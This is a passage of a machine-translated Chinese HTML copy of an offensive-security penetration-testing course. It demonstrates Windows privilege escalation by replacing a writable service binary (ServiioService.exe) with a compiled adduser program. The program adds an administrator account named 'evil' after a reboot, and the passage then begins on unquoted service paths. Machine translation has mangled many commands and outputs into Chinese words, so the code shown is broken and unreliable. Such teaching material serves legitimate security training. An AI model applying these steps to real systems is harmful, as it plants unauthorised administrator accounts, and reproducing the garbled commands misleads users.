<div style="position:absolute;top:137006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将</font><font style="vertical-align: inherit;">在 Kali 机器上使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">i686-w64-mingw32-gcc</font></font></b><font style="vertical-align: inherit;">交叉编译</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">530</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码</font><font style="vertical-align: inherit;">，使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">-o</font></font></b></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:137026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定编译的可执行文件的名称：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:137061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">i686-w64-mingw32-gcc adduser.c -o adduser.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:137080;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 567 - 编译 adduser.c 代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:137109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以将它转移到我们的目标并用我们的恶意软件替换原始的 ServiioService.exe 二进制文件</font></font></nobr></div>
<div style="position:absolute;top:137129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复制：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:137163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">移动 "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program F</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:137181;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件\Serviio\bin\ServiioService_original.exe"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:137197;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">移动了 1 个文件。</font></font></nobr></div>
<div style="position:absolute;top:137231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">移动 adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"</font></font></font></b></nobr></div>
<div style="position:absolute;top:137248;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">移动了 1 个文件。</font></font></nobr></div>
<div style="position:absolute;top:137282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dir "C:\Program Files\Serviio\bin\"</font></font></font></b></nobr></div>
<div style="position:absolute;top:137299;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">驱动器 C 中的卷没有标签。</font></font></nobr></div>
<div style="position:absolute;top:137316;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卷序列号为 56B9-BB74</font></font></nobr></div>
<div style="position:absolute;top:137350;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Program Files\Serviio\bin 目录</font></font></nobr></div>
<div style="position:absolute;top:137384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01/26/2018 07:21 AM &lt;目录&gt;    </font></font></nobr></div>
<div style="position:absolute;top:137384;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></nobr></div>
<div style="position:absolute;top:137401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01/26/2018 07:21 AM &lt;目录&gt;    </font></font></nobr></div>
<div style="position:absolute;top:137401;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">..</font></font></nobr></div>
<div style="position:absolute;top:137418;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12/04/2016 下午 08:30    </font></font></nobr></div>
<div style="position:absolute;top:137418;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第867章</font></font></nobr></div>
<div style="position:absolute;top:137435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01/26/2018 07:19 AM    </font></font></nobr></div>
<div style="position:absolute;top:137435;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">48,373 </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ServiioService.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:137452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12/04/2016 下午 08:30    </font></font></nobr></div>
<div style="position:absolute;top:137452;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10 ServiioService.exe.vmoptions</font></font></nobr></div>
<div style="position:absolute;top:137469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12/04/2016 下午 08:30    </font></font></nobr></div>
<div style="position:absolute;top:137469;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">413,696 </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ServiioService_original.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:137486;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4 个文件    </font></font></nobr></div>
<div style="position:absolute;top:137486;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">462,946 字节</font></font></nobr></div>
<div style="position:absolute;top:137503;left:230"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 目录 3,826,667,520 字节空闲</font></font></nobr></div>
<div style="position:absolute;top:137522;left:246"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 568 - 用我们的恶意文件替换 ServiioService.exe 二进制文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:137552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了执行二进制文件，我们可以尝试重新启动服务。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:137586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络停止服务</font></font></font></b></nobr></div>
<div style="position:absolute;top:137604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发生系统错误 5。</font></font></nobr></div>
<div style="position:absolute;top:137637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问被拒绝。</font></font></nobr></div>
<div style="position:absolute;top:137657;left:259"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 569 - 尝试重新启动服务并重新启动机器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:137686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不幸的是，我们似乎没有足够的权限来停止 Serviio 服务。</font><font style="vertical-align: inherit;">这是</font></font></nobr></div>
<div style="position:absolute;top:137706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">预期，因为大多数服务由管理用户管理。</font></font></nobr></div>
<div style="position:absolute;top:137738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们没有权限手动重启服务，我们必须考虑另一个</font></font></nobr></div>
<div style="position:absolute;top:137758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法。</font><font style="vertical-align: inherit;">如果服务设置为“自动”，我们也许可以通过重新启动服务来重新启动服务</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:137855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">530 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Cross_compiler</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:137983;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="117"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 117 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:138016;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:139093;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:139093;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:139093;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">558</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:138112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font><font style="vertical-align: inherit;">让我们在 Windows 的帮助下检查 Serviio 服务的启动选项</font></font></nobr></div>
<div style="position:absolute;top:138131;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理仪表命令行：</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">531</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:138166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic 服务，其中 caption="Serviio" 获取名称、标题、状态、startm</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:138183;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">颂</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:138200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标题名称 StartMode 状态</font></font></nobr></div>
<div style="position:absolute;top:138217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">伺服伺服  </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">汽车</font></font></font></b></nobr></div>
<div style="position:absolute;top:138217;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跑步</font></font></nobr></div>
<div style="position:absolute;top:138236;left:283"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 570 - 显示易受攻击的服务的 StartMode</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:138266;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此服务将在重新启动后自动启动。</font><font style="vertical-align: inherit;">现在，让我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令来</font></font></nobr></div>
<div style="position:absolute;top:138285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">判断我们当前的用户是否有重启系统的权限：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:138320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami /priv</font></font></font></b></nobr></div>
<div style="position:absolute;top:138354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特权信息</font></font></nobr></div>
<div style="position:absolute;top:138371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---------------</font></font></nobr></div>
<div style="position:absolute;top:138405;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限名称    </font></font></nobr></div>
<div style="position:absolute;top:138405;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述    </font></font></nobr></div>
<div style="position:absolute;top:138405;left:652"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态</font></font></nobr></div>
<div style="position:absolute;top:138422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ========================</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:138439;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关机权限    </font></font></b></nobr></div>
<div style="position:absolute;top:138439;left:352"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关闭系统    </font></font></b></nobr></div>
<div style="position:absolute;top:138439;left:652"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已禁用</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:138456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeChangeNotifyPrivilege 绕过遍历检查    </font></font></nobr></div>
<div style="position:absolute;top:138456;left:652"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用</font></font></nobr></div>
<div style="position:absolute;top:138473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeUndock权限    </font></font></nobr></div>
<div style="position:absolute;top:138473;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从扩展坞移除计算机已禁用</font></font></nobr></div>
<div style="position:absolute;top:138490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeIncreaseWorkingSetPrivilege 增加一个进程工作集 Disabled</font></font></nobr></div>
<div style="position:absolute;top:138506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时区权限    </font></font></nobr></div>
<div style="position:absolute;top:138506;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改时区    </font></font></nobr></div>
<div style="position:absolute;top:138506;left:652"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已禁用</font></font></nobr></div>
<div style="position:absolute;top:138526;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 571 - 检查重启权限</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:138555;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面的清单显示我们的用户已被授予关闭权限</font></font></nobr></div>
<div style="position:absolute;top:138575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeShutdownPrivilege</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">532</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (等等) 因此我们应该能够启动一个系统</font></font></nobr></div>
<div style="position:absolute;top:138594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关机或重启。</font><font style="vertical-align: inherit;">请注意，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Disabled</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态仅指示当前是否启用了权限</font></font></nobr></div>
<div style="position:absolute;top:138613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于运行过程。</font><font style="vertical-align: inherit;">在我们的例子中，这意味着</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有请求，因此不是</font></font></nobr></div>
<div style="position:absolute;top:138633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前使用的是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeShutdownPrivilege</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限。</font></font></nobr></div>
<div style="position:absolute;top:138665;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeShutdownPrivilege</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不存在，我们将不得不等待受害者手动启动</font></font></nobr></div>
<div style="position:absolute;top:138685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务，这对我们来说不太方便。</font></font></nobr></div>
<div style="position:absolute;top:138718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们继续并</font><font style="vertical-align: inherit;">在零秒 ( </font><b><font style="font-size:13px"><font style="vertical-align: inherit;">/t 0</font></font></b><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">内</font><font style="vertical-align: inherit;">重新启动 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/r</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )：</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:138753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student\Desktop&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关机 /r /t 0</font></font></font></b></nobr></div>
<div style="position:absolute;top:138772;left:356"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 572 - 重新启动机器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:138801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在重启已经完成，我们应该能够使用</font></font></nobr></div>
<div style="position:absolute;top:138821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名为“evil”，密码为“Ev!lpass”。</font><font style="vertical-align: inherit;">之后，我们可以确认恶意用户是一部分</font></font></nobr></div>
<div style="position:absolute;top:138840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地管理员组使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net localgroup</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:138875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\evil&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络本地组管理员</font></font></font></b></nobr></div>
<div style="position:absolute;top:138892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别名管理员</font></font></nobr></div>
<div style="position:absolute;top:138909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">评论管理员对计算机/域具有完全且不受限制的访问权限</font></font></nobr></div>
<div style="position:absolute;top:138943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会员</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:139023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">531 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic</font></font></font></nobr></div>
<div style="position:absolute;top:139043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">532 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:139171;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="118"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 118 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:139204;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:140281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:140281;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:140281;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">559</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:139300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- -----------------------------</font></font></nobr></div>
<div style="position:absolute;top:139316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行政</font></font></nobr></div>
<div style="position:absolute;top:139333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行政人员</font></font></nobr></div>
<div style="position:absolute;top:139350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">corp\域管理员</font></font></nobr></div>
<div style="position:absolute;top:139368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公司\offsec</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:139384;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">邪恶的</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:139401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功完成。</font></font></nobr></div>
<div style="position:absolute;top:139421;left:263"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 573 - “evil” 用户是 Administrators 组的成员</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:139450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">非常好。</font><font style="vertical-align: inherit;">我们已经使用不安全的文件权限将服务程序替换为我们自己的</font></font></nobr></div>
<div style="position:absolute;top:139469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">恶意二进制文件，运行时授予我们对系统的管理访问权限。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:139504;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.4.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:139534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 以非特权用户身份登录您的 Windows 客户端并尝试提升您的特权</font></font></nobr></div>
<div style="position:absolute;top:139553;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统使用上述漏洞和技术。</font></font></nobr></div>
<div style="position:absolute;top:139582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 尝试获取远程系统外壳而不是添加恶意用户。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:139616;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.5</font></font></i></nobr></div>
<div style="position:absolute;top:139616;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用未引用的服务路径</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:139654;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一个有趣的攻击媒介，可导致 Windows 操作系统的权限提升</font></font></nobr></div>
<div style="position:absolute;top:139673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统围绕</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未引用的服务路径</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">533</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们写我们可以利用这种攻击</font></font></nobr></div>
<div style="position:absolute;top:139693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务的主目录和子目录的权限，但不能替换其中的文件。</font></font></nobr></div>
<div style="position:absolute;top:139712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，模块的这一部分将无法在您的专用客户端上重现。</font></font></nobr></div>
<div style="position:absolute;top:139731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，您将能够在实验室环境中的各种主机上使用此技术。</font></font></nobr></div>
<div style="position:absolute;top:139764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如我们在上一节中看到的，每个 Windows 服务都映射到一个可执行文件，该文件将</font></font></nobr></div>
<div style="position:absolute;top:139784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在服务启动时运行。</font><font style="vertical-align: inherit;">大多数情况下，第三方软件附带的服务</font></font></nobr></div>
<div style="position:absolute;top:139803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储在 C:\Program Files 目录下，该目录的名称中包含一个空格字符。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:139822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能会变成特权升级攻击的机会。</font></font></nobr></div>
<div style="position:absolute;top:139855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用包含空格的文件或目录路径时，开发人员应始终确保</font></font></nobr></div>
<div style="position:absolute;top:139874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它们用引号括起来。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">534</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这确保它们被显式声明。</font><font style="vertical-align: inherit;">然而，</font></font></nobr></div>
<div style="position:absolute;top:139894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果情况并非如此并且路径名未加引号，则可以对其进行解释。</font><font style="vertical-align: inherit;">具体来说，在</font></font></nobr></div>
<div style="position:absolute;top:139913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于可执行路径，每个空白字符之后的任何内容都将被处理</font></font></nobr></div>
<div style="position:absolute;top:139932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为可执行文件的潜在参数或选项。</font></font></nobr></div>
<div style="position:absolute;top:139965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，假设我们有一个服务存储在诸如 C:\Program Files\My 的路径中</font></font></nobr></div>
<div style="position:absolute;top:139985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序\我的服务\service.exe。</font><font style="vertical-align: inherit;">如果服务路径存储时不加</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">引号</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，则每当 Windows 启动时</font></font></nobr></div>
<div style="position:absolute;top:140004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它将尝试从以下路径运行可执行文件的服务：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
